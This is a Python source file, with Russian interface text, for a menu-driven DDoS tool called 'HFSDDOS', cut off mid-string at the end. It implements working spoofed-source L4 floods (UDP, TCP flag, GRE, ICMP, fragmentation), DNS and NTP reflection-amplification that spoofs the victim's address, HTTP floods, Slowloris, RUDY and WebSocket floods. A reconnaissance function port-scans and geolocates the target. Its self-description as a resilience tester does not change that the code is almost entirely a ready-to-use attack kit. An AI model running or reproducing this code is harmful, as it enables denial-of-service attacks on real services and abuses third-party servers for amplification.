import socket
import random
import time
import threading
import os
import http.client
import sys
import logging
import colorama
from colorama import Fore, Style
from typing import List, Dict, Optional
from concurrent.futures import ThreadPoolExecutor
import websocket  # Для WebSocket Flood

# Попытка импорта дополнительных библиотек
try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
try:
    import dns.resolver
    DNSPYTHON_AVAILABLE = True
except ImportError:
    DNSPYTHON_AVAILABLE = False

colorama.init(autoreset=True)

# Настройка логирования
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def check_root() -> bool:
    """Проверка наличия рут-доступа"""
    try:
        return os.geteuid() == 0
    except AttributeError:
        # Если os.geteuid() недоступен (например, на Windows), считаем, что рут-доступа нет
        return False

class DDoSAttack:
    def __init__(self, max_packets: int = 100000):
        self.sent: int = 0
        self.max_packets: int = max_packets
        self.running: bool = True
        self.lock: threading.Lock = threading.Lock()
        self.payload: bytes = random._urandom(2048)
        self.buffer: List = []

    def generate_user_agent(self) -> str:
        """Генерация случайного User-Agent"""
        browsers = [
            "Chrome", "Firefox", "Safari", "Edge", "Opera"
        ]
        os_systems = [
            "Windows NT 10.0; Win64; x64",
            "Macintosh; Intel Mac OS X 10_15_7",
            "X11; Linux x86_64",
            "Windows NT 6.1; Win64; x64",
            "Macintosh; Intel Mac OS X 11_2_3"
        ]
        browser = random.choice(browsers)
        os_system = random.choice(os_systems)

        if browser == "Chrome":
            version = f"Chrome/{random.randint(80, 120)}.0.{random.randint(4000, 5000)}.{random.randint(100, 200)}"
        elif browser == "Firefox":
            version = f"Firefox/{random.randint(80, 120)}.0"
        elif browser == "Safari":
            version = f"Safari/605.1.15"
        elif browser == "Edge":
            version = f"Edg/{random.randint(80, 120)}.0.{random.randint(1000, 2000)}.{random.randint(50, 150)}"
        else:  # Opera
            version = f"OPR/{random.randint(60, 100)}.0.{random.randint(3000, 4000)}.{random.randint(100, 200)}"

        return f"Mozilla/5.0 ({os_system}) AppleWebKit/537.36 (KHTML, like Gecko) {version}"

    def generate_headers(self) -> Dict[str, str]:
        """Генерация случайных HTTP-заголовков"""
        return {
            "User-Agent": self.generate_user_agent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        }

    def udp_flood(self, ip: str, port: int, start_event: threading.Event, charge_size: int) -> None:
        """UDP-флуд: только через scapy, требует рут"""
        if not check_root():
            logger.error("UDP Flood требует рут-доступа! Запустите программу с правами администратора.")
            return

        try:
            from scapy.all import IP, UDP, send, RandIP
        except (ImportError, PermissionError) as e:
            logger.error(f"Не удалось запустить UDP Flood: {e}. Убедитесь, что scapy установлен и есть рут-доступ.")
            return

        while self.running and self.sent < self.max_packets:
            start_event.wait()
            with self.lock:
                for _ in range(charge_size):
                    packet = IP(dst=ip, src=RandIP()) / UDP(dport=port, sport=random.randint(1024, 65535)) / self.payload
                    send(packet, verbose=0)
                    self.sent += 1
                logger.info(f"UDP: [{self.sent}/{self.max_packets}] -> {ip}:{port}")
            start_event.clear()

    def tcp_syn_flood(self, ip: str, port: int, start_event: threading.Event, charge_size: int) -> None:
        """TCP SYN-флуд: только через scapy, требует рут"""
        if not check_root():
            logger.error("TCP SYN Flood требует рут-доступа! Запустите программу с правами администратора.")
            return

        try:
            from scapy.all import IP, TCP, send, RandIP
        except (ImportError, PermissionError) as e:
            logger.error(f"Не удалось запустить TCP SYN Flood: {e}. Убедитесь, что scapy установлен и есть рут-доступ.")
            return

        while self.running and self.sent < self.max_packets:
            start_event.wait()
            with self.lock:
                for _ in range(charge_size):
                    packet = IP(dst=ip, src=RandIP()) / TCP(dport=port, sport=random.randint(1024, 65535), flags="S")
                    send(packet, verbose=0)
                    self.sent += 1
                logger.info(f"TCP SYN: [{self.sent}/{self.max_packets}] -> {ip}:{port}")
            start_event.clear()

    def tcp_fin_flood(self, ip: str, port: int, start_event: threading.Event, charge_size: int) -> None:
        """TCP FIN-флуд: только через scapy, требует рут"""
        if not check_root():
            logger.error("TCP FIN Flood требует рут-доступа! Запустите программу с правами администратора.")
            return

        try:
            from scapy.all import IP, TCP, send, RandIP
        except (ImportError, PermissionError) as e:
            logger.error(f"Не удалось запустить TCP FIN Flood: {e}. Убедитесь, что scapy установлен и есть рут-доступ.")
            return

        while self.running and self.sent < self.max_packets:
            start_event.wait()
            with self.lock:
                for _ in range(charge_size):
                    packet = IP(dst=ip, src=RandIP()) / TCP(dport=port, sport=random.randint(1024, 65535), flags="F")
                    send(packet, verbose=0)
                    self.sent += 1
                logger.info(f"TCP FIN: [{self.sent}/{self.max_packets}] -> {ip}:{port}")
            start_event.clear()

    def tcp_rst_flood(self, ip: str, port: int, start_event: threading.Event, charge_size: int) -> None:
        """TCP RST-флуд: только через scapy, требует рут"""
        if not check_root():
            logger.error("TCP RST Flood требует рут-доступа! Запустите программу с правами администратора.")
            return

        try:
            from scapy.all import IP, TCP, send, RandIP
        except (ImportError, PermissionError) as e:
            logger.error(f"Не удалось запустить TCP RST Flood: {e}. Убедитесь, что scapy установлен и есть рут-доступ.")
            return

        while self.running and self.sent < self.max_packets:
            start_event.wait()
            with self.lock:
                for _ in range(charge_size):
                    packet = IP(dst=ip, src=RandIP()) / TCP(dport=port, sport=random.randint(1024, 65535), flags="R")
                    send(packet, verbose=0)
                    self.sent += 1
                logger.info(f"TCP RST: [{self.sent}/{self.max_packets}] -> {ip}:{port}")
            start_event.clear()

    def tcp_ack_flood(self, ip: str, port: int, start_event: threading.Event, charge_size: int) -> None:
        """TCP ACK-флуд: только через scapy, требует рут"""
        if not check_root():
            logger.error("TCP ACK Flood требует рут-доступа! Запустите программу с правами администратора.")
            return

        try:
            from scapy.all import IP, TCP, send, RandIP
        except (ImportError, PermissionError) as e:
            logger.error(f"Не удалось запустить TCP ACK Flood: {e}. Убедитесь, что scapy установлен и есть рут-доступ.")
            return

        while self.running and self.sent < self.max_packets:
            start_event.wait()
            with self.lock:
                for _ in range(charge_size):
                    packet = IP(dst=ip, src=RandIP()) / TCP(dport=port, sport=random.randint(1024, 65535), flags="A")
                    send(packet, verbose=0)
                    self.sent += 1
                logger.info(f"TCP ACK: [{self.sent}/{self.max_packets}] -> {ip}:{port}")
            start_event.clear()

    def gre_flood(self, ip: str, start_event: threading.Event, charge_size: int) -> None:
        """GRE Flood: только через scapy, требует рут"""
        if not check_root():
            logger.error("GRE Flood требует рут-доступа! Запустите программу с правами администратора.")
            return

        try:
            from scapy.all import IP, GRE, send, RandIP
        except (ImportError, PermissionError) as e:
            logger.error(f"Не удалось запустить GRE Flood: {e}. Убедитесь, что scapy установлен и есть рут-доступ.")
            return

        while self.running and self.sent < self.max_packets:
            start_event.wait()
            with self.lock:
                for _ in range(charge_size):
                    packet = IP(dst=ip, src=RandIP()) / GRE() / self.payload
                    send(packet, verbose=0)
                    self.sent += 1
                logger.info(f"GRE Flood: [{self.sent}/{self.max_packets}] -> {ip}")
            start_event.clear()

    def udp_fragmentation_flood(self, ip: str, port: int, start_event: threading.Event, charge_size: int) -> None:
        """UDP Fragmentation-флуд: только через scapy, требует рут"""
        if not check_root():
            logger.error("UDP Fragmentation Flood требует рут-доступа! Запустите программу с правами администратора.")
            return

        try:
            from scapy.all import IP, UDP, send, RandIP
        except (ImportError, PermissionError) as e:
            logger.error(f"Не удалось запустить UDP Fragmentation Flood: {e}. Убедитесь, что scapy установлен и есть рут-доступ.")
            return

        fragment_size = 100
        while self.running and self.sent < self.max_packets:
            start_event.wait()
            with self.lock:
                for _ in range(charge_size):
                    for i in range(0, len(self.payload), fragment_size):
                        packet = IP(dst=ip, src=RandIP(), flags="MF") / UDP(dport=port, sport=random.randint(1024, 65535)) / self.payload[i:i+fragment_size]
                        send(packet, verbose=0)
                        self.sent += 1
                    packet = IP(dst=ip, src=RandIP()) / UDP(dport=port, sport=random.randint(1024, 65535)) / self.payload[-fragment_size:]
                    send(packet, verbose=0)
                    self.sent += 1
                logger.info(f"UDP Fragmentation: [{self.sent}/{self.max_packets}] -> {ip}:{port}")
            start_event.clear()

    def icmp_flood(self, ip: str, start_event: threading.Event, charge_size: int) -> None:
        """ICMP-флуд: только через scapy, требует рут"""
        if not check_root():
            logger.error("ICMP Flood требует рут-доступа! Запустите программу с правами администратора.")
            return

        try:
            from scapy.all import IP, ICMP, send, RandIP
        except (ImportError, PermissionError) as e:
            logger.error(f"Не удалось запустить ICMP Flood: {e}. Убедитесь, что scapy установлен и есть рут-доступ.")
            return

        while self.running and self.sent < self.max_packets:
            start_event.wait()
            with self.lock:
                for _ in range(charge_size):
                    packet = IP(dst=ip, src=RandIP()) / ICMP() / self.payload
                    send(packet, verbose=0)
                    self.sent += 1
                logger.info(f"ICMP: [{self.sent}/{self.max_packets}] -> {ip}")
            start_event.clear()

    def dns_amplification(self, ip: str, dns_server: str, start_event: threading.Event, charge_size: int) -> None:
        """DNS Amplification: только через scapy, требует рут"""
        if not check_root():
            logger.error("DNS Amplification требует рут-доступа! Запустите программу с правами администратора.")
            return

        dns_query = b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01'
        try:
            from scapy.all import IP, UDP, send
        except (ImportError, PermissionError) as e:
            logger.error(f"Не удалось запустить DNS Amplification: {e}. Убедитесь, что scapy установлен и есть рут-доступ.")
            return

        while self.running and self.sent < self.max_packets:
            start_event.wait()
            with self.lock:
                for _ in range(charge_size):
                    packet = IP(dst=dns_server, src=ip) / UDP(dport=53, sport=random.randint(1024, 65535)) / dns_query
                    send(packet, verbose=0)
                    self.sent += 1
                logger.info(f"DNS Amplification: [{self.sent}/{self.max_packets}] -> {ip} via {dns_server}")
            start_event.clear()

    def ntp_amplification(self, ip: str, ntp_server: str, start_event: threading.Event, charge_size: int) -> None:
        """NTP Amplification: только через scapy, требует рут"""
        if not check_root():
            logger.error("NTP Amplification требует рут-доступа! Запустите программу с правами администратора.")
            return

        ntp_query = b'\xe3\x00\x04\xfa\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00'
        try:
            from scapy.all import IP, UDP, send
        except (ImportError, PermissionError) as e:
            logger.error(f"Не удалось запустить NTP Amplification: {e}. Убедитесь, что scapy установлен и есть рут-доступ.")
            return

        while self.running and self.sent < self.max_packets:
            start_event.wait()
            with self.lock:
                for _ in range(charge_size):
                    packet = IP(dst=ntp_server, src=ip) / UDP(dport=123, sport=random.randint(1024, 65535)) / ntp_query
                    send(packet, verbose=0)
                    self.sent += 1
                logger.info(f"NTP Amplification: [{self.sent}/{self.max_packets}] -> {ip} via {ntp_server}")
            start_event.clear()

    def http_flood(self, ip: str, port: int, start_event: threading.Event, charge_size: int) -> None:
        """HTTP GET-флуд"""
        while self.running and self.sent < self.max_packets:
            connections = []
            for _ in range(charge_size):
                try:
                    conn = http.client.HTTPConnection(ip, port, timeout=2)
                    connections.append(conn)
                except Exception as e:
                    logger.error(f"Ошибка создания HTTP-соединения: {e}")
            logger.info(f"HTTP GET: Накоплено {len(connections)} соединений для {ip}:{port}")
            start_event.wait()
            with ThreadPoolExecutor(max_workers=charge_size) as executor:
                futures = []
                for conn in connections:
                    headers = self.generate_headers()
                    futures.append(executor.submit(self._send_http_request, conn, headers, "GET"))
                for future in futures:
                    try:
                        future.result()
                        with self.lock:
                            self.sent += 1
                    except Exception as e:
                        logger.error(f"Ошибка HTTP GET-запроса: {e}")
            logger.info(f"HTTP GET: [{self.sent}/{self.max_packets}] -> {ip}:{port}")
            for conn in connections:
                conn.close()
            start_event.clear()

    def post_flood(self, ip: str, port: int, start_event: threading.Event, charge_size: int) -> None:
        """HTTP POST-флуд"""
        while self.running and self.sent < self.max_packets:
            connections = []
            for _ in range(charge_size):
                try:
                    conn = http.client.HTTPConnection(ip, port, timeout=2)
                    connections.append(conn)
                except Exception as e:
                    logger.error(f"Ошибка создания HTTP-соединения: {e}")
            logger.info(f"HTTP POST: Накоплено {len(connections)} соединений для {ip}:{port}")
            start_event.wait()
            with ThreadPoolExecutor(max_workers=charge_size) as executor:
                futures = []
                for conn in connections:
                    headers = self.generate_headers()
                    headers["Content-Type"] = "application/x-www-form-urlencoded"
                    body = "data=" + "A" * 10000
                    futures.append(executor.submit(self._send_http_request, conn, headers, "POST", body))
                for future in futures:
                    try:
                        future.result()
                        with self.lock:
                            self.sent += 1
                    except Exception as e:
                        logger.error(f"Ошибка HTTP POST-запроса: {e}")
            logger.info(f"HTTP POST: [{self.sent}/{self.max_packets}] -> {ip}:{port}")
            for conn in connections:
                conn.close()
            start_event.clear()

    def head_flood(self, ip: str, port: int, start_event: threading.Event, charge_size: int) -> None:
        """HTTP HEAD-флуд"""
        while self.running and self.sent < self.max_packets:
            connections = []
            for _ in range(charge_size):
                try:
                    conn = http.client.HTTPConnection(ip, port, timeout=2)
                    connections.append(conn)
                except Exception as e:
                    logger.error(f"Ошибка создания HTTP-соединения: {e}")
            logger.info(f"HTTP HEAD: Накоплено {len(connections)} соединений для {ip}:{port}")
            start_event.wait()
            with ThreadPoolExecutor(max_workers=charge_size) as executor:
                futures = []
                for conn in connections:
                    headers = self.generate_headers()
                    futures.append(executor.submit(self._send_http_request, conn, headers, "HEAD"))
                for future in futures:
                    try:
                        future.result()
                        with self.lock:
                            self.sent += 1
                    except Exception as e:
                        logger.error(f"Ошибка HTTP HEAD-запроса: {e}")
            logger.info(f"HTTP HEAD: [{self.sent}/{self.max_packets}] -> {ip}:{port}")
            for conn in connections:
                conn.close()
            start_event.clear()

    def options_flood(self, ip: str, port: int, start_event: threading.Event, charge_size: int) -> None:
        """HTTP OPTIONS-флуд"""
        while self.running and self.sent < self.max_packets:
            connections = []
            for _ in range(charge_size):
                try:
                    conn = http.client.HTTPConnection(ip, port, timeout=2)
                    connections.append(conn)
                except Exception as e:
                    logger.error(f"Ошибка создания HTTP-соединения: {e}")
            logger.info(f"HTTP OPTIONS: Накоплено {len(connections)} соединений для {ip}:{port}")
            start_event.wait()
            with ThreadPoolExecutor(max_workers=charge_size) as executor:
                futures = []
                for conn in connections:
                    headers = self.generate_headers()
                    futures.append(executor.submit(self._send_http_request, conn, headers, "OPTIONS"))
                for future in futures:
                    try:
                        future.result()
                        with self.lock:
                            self.sent += 1
                    except Exception as e:
                        logger.error(f"Ошибка HTTP OPTIONS-запроса: {e}")
            logger.info(f"HTTP OPTIONS: [{self.sent}/{self.max_packets}] -> {ip}:{port}")
            for conn in connections:
                conn.close()
            start_event.clear()

    def slow_post(self, ip: str, port: int, start_event: threading.Event, charge_size: int) -> None:
        """Slow POST"""
        sockets = []
        while self.running and self.sent < self.max_packets:
            for _ in range(min(charge_size, 1200 - len(sockets))):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(4)
                    sock.connect((ip, port))
                    sock.send(f"POST / HTTP/1.1\r\n".encode())
                    sock.send(f"Host: {ip}\r\n".encode())
                    sock.send(f"User-Agent: {self.generate_user_agent()}\r\n".encode())
                    sock.send(f"Content-Length: 10000\r\n".encode())
                    sock.send(f"Content-Type: application/x-www-form-urlencoded\r\n".encode())
                    sock.send(b"\r\n")
                    sockets.append(sock)
                except Exception as e:
                    logger.error(f"Ошибка Slow POST: {e}")
            logger.info(f"Slow POST: Накоплено {len(sockets)} соединений для {ip}:{port}")
            start_event.wait()
            sockets_copy = sockets[:]
            for sock in sockets_copy:
                try:
                    sock.send(b"A" * 100)
                    with self.lock:
                        self.sent += 1
                except:
                    sockets.remove(sock)
                    sock.close()
            logger.info(f"Slow POST: [{self.sent}/{self.max_packets}] -> {ip}:{port}")
            start_event.clear()
            time.sleep(1)

    def rudy(self, ip: str, port: int, start_event: threading.Event, charge_size: int) -> None:
        """RUDY"""
        sockets = []
        while self.running and self.sent < self.max_packets:
            for _ in range(min(charge_size, 1200 - len(sockets))):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(4)
                    sock.connect((ip, port))
                    sock.send(f"POST / HTTP/1.1\r\n".encode())
                    sock.send(f"Host: {ip}\r\n".encode())
                    sock.send(f"User-Agent: {self.generate_user_agent()}\r\n".encode())
                    sock.send(f"Content-Length: 10000\r\n".encode())
                    sock.send(f"Content-Type: application/x-www-form-urlencoded\r\n".encode())
                    sock.send(b"\r\n")
                    sockets.append(sock)
                except Exception as e:
                    logger.error(f"Ошибка RUDY: {e}")
            logger.info(f"RUDY: Накоплено {len(sockets)} соединений для {ip}:{port}")
            start_event.wait()
            sockets_copy = sockets[:]
            for sock in sockets_copy:
                try:
                    sock.send(b"A")
                    with self.lock:
                        self.sent += 1
                except:
                    sockets.remove(sock)
                    sock.close()
            logger.info(f"RUDY: [{self.sent}/{self.max_packets}] -> {ip}:{port}")
            start_event.clear()
            time.sleep(1)

    def slowloris(self, ip: str, port: int, start_event: threading.Event, charge_size: int) -> None:
        """Slowloris"""
        sockets = []
        while self.running and self.sent < self.max_packets:
            for _ in range(min(charge_size, 1200 - len(sockets))):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(4)
                    sock.connect((ip, port))
                    sock.send(f"GET /?{random.randint(1,9999999)} HTTP/1.1\r\n".encode())
                    sock.send(f"Host: {ip}\r\n".encode())
                    sock.send(f"User-Agent: {self.generate_user_agent()}\r\n".encode())
                    sockets.append(sock)
                except Exception as e:
                    logger.error(f"Ошибка Slowloris: {e}")
            logger.info(f"Slowloris: Накоплено {len(sockets)} соединений для {ip}:{port}")
            start_event.wait()
            sockets_copy = sockets[:]
            for sock in sockets_copy:
                try:
                    sock.send(b"X-a: b\r\n")
                    with self.lock:
                        self.sent += 1
                except:
                    sockets.remove(sock)
                    sock.close()
            logger.info(f"Slowloris: [{self.sent}/{self.max_packets}] -> {ip}:{port}")
            start_event.clear()
            time.sleep(0.1)

    def websocket_flood(self, ip: str, port: int, start_event: threading.Event, charge_size: int) -> None:
        """WebSocket-флуд"""
        ws_connections = []
        while self.running and self.sent < self.max_packets:
            for _ in range(charge_size):
                try:
                    ws = websocket.WebSocket()
                    ws.connect(f"ws://{ip}:{port}/")
                    ws_connections.append(ws)
                except Exception as e:
                    logger.error(f"Ошибка WebSocket: {e}")
            logger.info(f"WebSocket: Накоплено {len(ws_connections)} соединений для {ip}:{port}")
            start_event.wait()
            with ThreadPoolExecutor(max_workers=charge_size) as executor:
                futures = []
                for ws in ws_connections:
                    futures.append(executor.submit(self._send_websocket_message, ws))
                for future in futures:
                    try:
                        future.result()
                        with self.lock:
                            self.sent += 1
                    except Exception as e:
                        logger.error(f"Ошибка WebSocket-запроса: {e}")
            logger.info(f"WebSocket: [{self.sent}/{self.max_packets}] -> {ip}:{port}")
            for ws in ws_connections:
                ws.close()
            ws_connections.clear()
            start_event.clear()

    def _send_http_request(self, conn: http.client.HTTPConnection, headers: Dict[str, str], method: str, body: Optional[str] = None) -> None:
        """Вспомогательная функция для отправки HTTP-запроса"""
        conn.request(method, f"/?{random.randint(1,9999999)}", body=body, headers=headers)
        response = conn.getresponse()
        response.read()

    def _send_websocket_message(self, ws: websocket.WebSocket) -> None:
        """Вспомогательная функция для отправки WebSocket-сообщений"""
        ws.send("Flood message " + str(random.randint(1, 9999999)))

    def stop(self) -> None:
        """Остановка атаки"""
        self.running = False
        with self.lock:
            self.buffer.clear()

def power_charge_effect() -> None:
    """Эффект зарядки перед атакой"""
    os.system("clear")
    logger.info("Инициализация атаки...")
    for i in range(5, 0, -1):
        print(f"Запуск через {i} секунд...")
        time.sleep(1)
    os.system("clear")
    logger.info("Атака началась!")

def start_attack() -> None:
    """Запуск выбранной атаки"""
    os.system("clear")
    attack_types = {
        "1": ("udp_flood", "UDP Flood (L4)(ROOT)"),
        "2": ("tcp_syn_flood", "TCP SYN Flood (L4)(ROOT)"),
        "3": ("tcp_fin_flood", "TCP FIN Flood (L4)(ROOT)"),
        "4": ("udp_fragmentation_flood", "UDP Fragmentation Flood (L4)(ROOT)"),
        "5": ("icmp_flood", "ICMP Flood (L4)(ROOT)"),
        "6": ("dns_amplification", "DNS Amplification (L4)(ROOT)"),
        "7": ("ntp_amplification", "NTP Amplification (L4)(ROOT)"),
        "8": ("tcp_rst_flood", "TCP RST Flood (L4)(ROOT)"),
        "9": ("tcp_ack_flood", "TCP ACK Flood (L4)(ROOT)"),
        "10": ("gre_flood", "GRE Flood (L4)(ROOT)"),
        "11": ("http_flood", "HTTP GET Flood (L7)"),
        "12": ("post_flood", "HTTP POST Flood (L7)"),
        "13": ("rudy", "RUDY (L7)"),
        "14": ("slowloris", "Slowloris (L7)"),
        "15": ("websocket_flood", "WebSocket Flood (L7)"),
        "16": ("head_flood", "HTTP HEAD Flood (L7)"),
        "17": ("options_flood", "HTTP OPTIONS Flood (L7)"),
        "18": ("slow_post", "Slow POST (L7)")
    }
    print("\n=== Выбор типа атаки ===")
    for key, (_, name) in attack_types.items():
        print(f"{key}. {name}")
    
    choice = input("Выберите тип атаки (1-18): ")
    if choice not in attack_types:
        logger.error("Неверный выбор!")
        input("Нажмите Enter...")
        return

    attack_method, attack_name = attack_types[choice]
    attacker = DDoSAttack()
    ips = input("IP/Host цели (127.0.0.1; 127.0.0.1,192.168.1.1): ").split(",")
    ips = [ip.strip() for ip in ips if ip.strip()]
    
    if not ips:
        logger.error("Не указаны цели!")
        input("Нажмите Enter...")
        return

    ports = ["0"] if attack_method in ["icmp_flood", "gre_flood"] else input("Порты (80; 80,8080,443; all): ").split(",")
    ports = [port.strip() for port in ports] if ports[0].lower() != "all" else ["all"]

    dns_server = input("DNS сервер (для DNS Amplification, например 8.8.8.8, иначе оставьте пустым): ") if attack_method == "dns_amplification" else None
    ntp_server = input("NTP сервер (для NTP Amplification, например 0.pool.ntp.org, иначе оставьте пустым): ") if attack_method == "ntp_amplification" else None

    thread_count = int(input("Количество потоков (1-100000): "))
    charge_size = int(input("Размер заряда (1-1000): "))

    start_event = threading.Event()
    threads = []

    for ip in ips:
        for _ in range(thread_count):
            port = random.randint(1, 65535) if ports[0] == "all" else int(random.choice(ports))
            if attack_method == "dns_amplification":
                thread = threading.Thread(target=getattr(attacker, attack_method), args=(ip, dns_server, start_event, charge_size))
            elif attack_method == "ntp_amplification":
                thread = threading.Thread(target=getattr(attacker, attack_method), args=(ip, ntp_server, start_event, charge_size))
            elif attack_method in ["icmp_flood", "gre_flood"]:
                thread = threading.Thread(target=getattr(attacker, attack_method), args=(ip, start_event, charge_size))
            else:
                thread = threading.Thread(target=getattr(attacker, attack_method), args=(ip, port, start_event, charge_size))
            threads.append(thread)

    for thread in threads:
        thread.start()

    try:
        while attacker.running and attacker.sent < attacker.max_packets:
            power_charge_effect()
            start_event.set()
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("Остановка атаки...")
        attacker.stop()

    for thread in threads:
        thread.join()

def host_info() -> None:
    """Получение подробной информации о хосте"""
    os.system("clear")
    print(Fore.GREEN + Style.BRIGHT + "=== Информация о хосте ===")
    target = input("Введите IP или хост (например, 8.8.8.8 или google.com): ").strip()
    if not target:
        logger.error("Не указан хост или IP!")
        input("Нажмите Enter...")
        return

    # Разрешение IP и имени хоста
    try:
        ip = socket.gethostbyname(target)
        hostname = socket.gethostbyaddr(ip)[0] if ip != target else target
    except socket.gaierror:
        ip = target
        hostname = "Не удалось определить имя хоста"
    except socket.herror:
        hostname = "Не удалось определить имя хоста"

    # Геолокация и ISP
    if REQUESTS_AVAILABLE:
        try:
            response = requests.get(f"https://ipinfo.io/{ip}/json")
            geo_data = response.json()
            country = geo_data.get("country", "Не определена")
            isp = geo_data.get("org", "Не определен")
            location = geo_data.get("city", "Не определен") + ", " + geo_data.get("region", "Не определен")
        except Exception as e:
            logger.error(f"Ошибка получения геолокации: {e}")
            country = isp = location = "Не удалось определить"
    else:
        country = isp = location = "Не доступно (требуется установка requests)"

    # Проверка открытых портов
    common_ports = [21, 22, 23, 25, 53, 80, 443, 8080]
    open_ports = []
    for port in common_ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip, port))
        if result == 0:
            open_ports.append(port)
        sock.close()

    # DNS-записи
    dns_records = {}
    try:
        dns_records["A"] = socket.gethostbyname_ex(target)[2]
    except:
        dns_records["A"] = "Не найдены"
    if DNSPYTHON_AVAILABLE:
        try:
            dns_records["NS"] = [ns.target.to_text() for ns in dns.resolver.resolve(target, "NS")]
        except:
            dns_records["NS"] = "Не найдены"
    else:
        dns_records["NS"] = "Не доступно (требуется установка dnspython)"

    # HTTP-заголовки для защиты и сервера
    protection = "Не определена"
    server_type = "Неизвестно"
    try:
        conn = http.client.HTTPConnection(ip, 80, timeout=2)
        conn.request("HEAD", "/", headers={"User-Agent": "Mozilla/5.0"})
        response = conn.getresponse()
        headers = response.getheaders()
        conn.close()
        for header, value in headers:
            if header.lower() == "server":
                server_type = value
            if "cloudflare" in value.lower():
                protection = "Cloudflare"
            elif "akamai" in value.lower():
                protection = "Akamai"
            elif "sucuri" in value.lower():
                protection = "Sucuri"
            elif "incapsula" in value.lower():
                protection = "Incapsula"
    except Exception as e:
        logger.error(f"Ошибка при проверке HTTP: {e}")

    # Вывод информации
    print(f"\n{Fore.YELLOW + Style.BRIGHT}=== Результаты анализа ===")
    print(f"{Fore.GREEN}Цель: {Fore.WHITE}{target}")
    print(f"{Fore.GREEN}IP-адрес: {Fore.WHITE}{ip}")
    print(f"{Fore.GREEN}Имя хоста: {Fore.WHITE}{hostname}")
    print(f"{Fore.GREEN}Страна: {Fore.WHITE}{country}")
    print(f"{Fore.GREEN}Оператор (ISP): {Fore.WHITE}{isp}")
    print(f"{Fore.GREEN}Местоположение: {Fore.WHITE}{location}")
    print(f"{Fore.GREEN}Открытые порты: {Fore.WHITE}{', '.join(map(str, open_ports)) if open_ports else 'Не найдены'}")
    print(f"{Fore.GREEN}DNS A-записи: {Fore.WHITE}{', '.join(dns_records['A']) if isinstance(dns_records['A'], list) else dns_records['A']}")
    print(f"{Fore.GREEN}DNS NS-записи: {Fore.WHITE}{', '.join(dns_records['NS']) if isinstance(dns_records['NS'], list) else dns_records['NS']}")
    print(f"{Fore.GREEN}Тип сервера: {Fore.WHITE}{server_type}")
    print(f"{Fore.GREEN}Защита: {Fore.WHITE}{protection}")
    print(f"{Fore.RED}Примечание: {Fore.WHITE}Для полной функциональности установите scapy, requests и dnspython.")
    input("\nНажмите Enter для возврата...")

def show_knowledge_base() -> None:
    """Отображение базы знаний"""
    os.system("clear")
    print(f"""
{colorama.Fore.GREEN + colorama.Style.BRIGHT}=== БАЗА ЗНАНИЙ ===
{colorama.Fore.YELLOW + colorama.Style.BRIGHT}L4 Атаки (Сетевой уровень):
{colorama.Fore.GREEN}- UDP Flood: {colorama.Fore.WHITE}Массовая отправка UDP-пакетов для перегрузки канала.
{colorama.Fore.GREEN}- TCP SYN Flood: {colorama.Fore.WHITE}Создание незавершенных TCP-соединений для перегрузки сервера.
{colorama.Fore.GREEN}- TCP FIN Flood: {colorama.Fore.WHITE}Отправка FIN-пакетов для завершения соединений.
{colorama.Fore.GREEN}- TCP RST Flood: {colorama.Fore.WHITE}Отправка RST-пакетов для разрыва соединений.
{colorama.Fore.GREEN}- TCP ACK Flood: {colorama.Fore.WHITE}Отправка ACK-пакетов для перегрузки сервера.
{colorama.Fore.GREEN}- GRE Flood: {colorama.Fore.WHITE}Отправка GRE-пакетов для перегрузки сети.
{colorama.Fore.GREEN}- UDP Fragmentation Flood: {colorama.Fore.WHITE}Отправка фрагментированных UDP-пакетов.
{colorama.Fore.GREEN}- ICMP Flood: {colorama.Fore.WHITE}Отправка ICMP-пакетов для перегрузки сети.
{colorama.Fore.GREEN}- DNS Amplification: {colorama.Fore.WHITE}Усиление трафика через DNS-запросы.
{colorama.Fore.GREEN}- NTP Amplification: {colorama.Fore.WHITE}Усиление трафика через NTP-запросы.

{colorama.Fore.YELLOW + colorama.Style.BRIGHT}L7 Атаки (Прикладной уровень):
{colorama.Fore.GREEN}- HTTP GET Flood: {colorama.Fore.WHITE}Многократные HTTP GET-запросы для перегрузки веб-сервера.
{colorama.Fore.GREEN}- HTTP POST Flood: {colorama.Fore.WHITE}Многократные HTTP POST-запросы с большими данными.
{colorama.Fore.GREEN}- HTTP HEAD Flood: {colorama.Fore.WHITE}Многократные HTTP HEAD-запросы для перегрузки сервера.
{colorama.Fore.GREEN}- HTTP OPTIONS Flood: {colorama.Fore.WHITE}Многократные HTTP OPTIONS-запросы для проверки методов.
{colorama.Fore.GREEN}- Slow POST: {colorama.Fore.WHITE}Медленная отправка POST-запросов для удержания соединений.
{colorama.Fore.GREEN}- RUDY: {colorama.Fore.WHITE}Медленная отправка POST-запросов для удержания соединений.
{colorama.Fore.GREEN}- Slowloris: {colorama.Fore.WHITE}Медленные GET-запросы для исчерпания пула потоков.
{colorama.Fore.GREEN}- WebSocket Flood: {colorama.Fore.WHITE}Многократное установление WebSocket-соединений.

{colorama.Fore.RED + colorama.Style.BRIGHT}Примечание: {colorama.Fore.WHITE}Для L4-атак требуется scapy и права администратора.
    """)
    input()

def show_about() -> None:
    """Отображение информации о программе"""
    os.system("clear")
    print(Fore.GREEN + Style.BRIGHT + "=== О программе ===")
    print(f"""
HFSDDOS - инструмент для тестирования устойчивости сетевых ресурсов.

Появился вопрос? Нашёл баг? пиши
Создатель: {colorama.Fore.BLUE}@hfscard{colorama.Fore.RESET}
